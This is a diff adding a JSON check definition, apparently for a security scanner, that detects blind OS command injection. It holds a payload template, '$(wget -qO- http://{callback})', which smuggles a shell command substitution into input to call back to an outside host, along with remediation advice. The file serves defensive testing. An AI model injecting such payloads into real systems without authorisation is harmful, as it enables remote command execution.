@@ -1,0 +1,20 @@
+{
+  "id": "m3-blind-cmdi-subshell-wget",
+  "bug_class": "command_injection",
+  "title": "Blind OS command injection (command substitution + wget)",
+  "severity": "Critical",
+  "applies_when": {
+    "always": true
+  },
+  "insertion_kinds": [],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "$(wget -qO- http://{callback})"
+  },
+  "references": [
+    "CWE-78",
+    "CAPEC-248"
+  ],
+  "remediation": "Never pass user input to a shell. Invoke programs with an argument vector (no shell interpolation), drop shell metacharacters and newlines, and validate against a strict allowlist. A blind command that reaches the unique callback proves out-of-band shell execution.",
+  "payload_family": "shell-subshell-wget"
+}
